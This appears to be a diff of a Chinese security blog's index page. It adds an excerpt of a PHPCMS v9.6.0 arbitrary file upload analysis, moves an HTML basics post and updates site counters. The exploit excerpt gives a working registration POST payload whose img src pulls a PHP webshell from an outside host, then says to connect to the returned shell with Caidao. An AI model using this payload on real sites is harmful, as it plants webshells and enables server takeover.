@@ -253,6 +253,156 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2017/08/10/PHPCMS-v9-6-0-任意文件上传漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/08/10/PHPCMS-v9-6-0-任意文件上传漏洞分析/" itemprop="url">PHPCMS v9.6.0 任意文件上传漏洞分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-10T18:44:11+08:00">
+                2017-08-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>注册页面<a href="http://127.0.0.1/audit/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1" target="_blank" rel="noopener">http://127.0.0.1/audit/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</a></p>
+<p>提交post数据，如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123123123&amp;password=123asdf456&amp;email=123123123qwe@qq.com&amp;info[content]=&lt;img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
+<p>页面会返回shell地址，菜刀连接即可；</p>
+<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/54698372.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/54698372.jpg" alt="img"></a></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/08/10/PHPCMS-v9-6-0-任意文件上传漏洞分析/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://21guns.top/2017/06/18/服务器相关安全设置/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -359,6 +509,161 @@
         
       
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2016/10/18/HTML/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2016/10/18/HTML/" itemprop="url">HTML</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-10-18T17:19:08+08:00">
+                2016-10-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web前端/" itemprop="url" rel="index">
+                    <span itemprop="name">Web前端</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><blockquote>
+<p>介绍html文档的基本结构，html常用标签的使用，理解html语言制作网页基本原理。</p>
+</blockquote>
+<h2 id="01-html概述和基本结构"><a href="#01-html概述和基本结构" class="headerlink" title="01-html概述和基本结构"></a>01-html概述和基本结构</h2><ul>
+<li><p>概述</p>
+<ul>
+<li>HTML是 HyperText Mark-up Language 的首字母简写，意思是超文本标记语言</li>
+<li>超文本指的是超链接，标记指的是标签，是一种用来制作网页的语言</li>
+<li>这种语言由一个个的标签组成，用这种语言制作的文件保存的是一个文本文件，文件的扩展名为html或者htm</li>
+<li>一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用文本的方式编辑它
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2016/10/18/HTML/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </li></ul></li></ul></div>
     
     
     
@@ -692,161 +997,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://21guns.top/2016/10/18/HTML/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ry1ynn">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ry1ynn's blogs">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/10/18/HTML/" itemprop="url">HTML</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-10-18T17:19:08+08:00">
-                2016-10-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web前端/" itemprop="url" rel="index">
-                    <span itemprop="name">Web前端</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><blockquote>
-<p>介绍html文档的基本结构，html常用标签的使用，理解html语言制作网页基本原理。</p>
-</blockquote>
-<h2 id="01-html概述和基本结构"><a href="#01-html概述和基本结构" class="headerlink" title="01-html概述和基本结构"></a>01-html概述和基本结构</h2><ul>
-<li><p>概述</p>
-<ul>
-<li>HTML是 HyperText Mark-up Language 的首字母简写，意思是超文本标记语言</li>
-<li>超文本指的是超链接，标记指的是标签，是一种用来制作网页的语言</li>
-<li>这种语言由一个个的标签组成，用这种语言制作的文件保存的是一个文本文件，文件的扩展名为html或者htm</li>
-<li>一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用文本的方式编辑它
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2016/10/18/HTML/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </li></ul></li></ul></div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -899,7 +1049,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">130</span>
+                  <span class="site-state-item-count">131</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -910,7 +1060,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -921,7 +1071,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
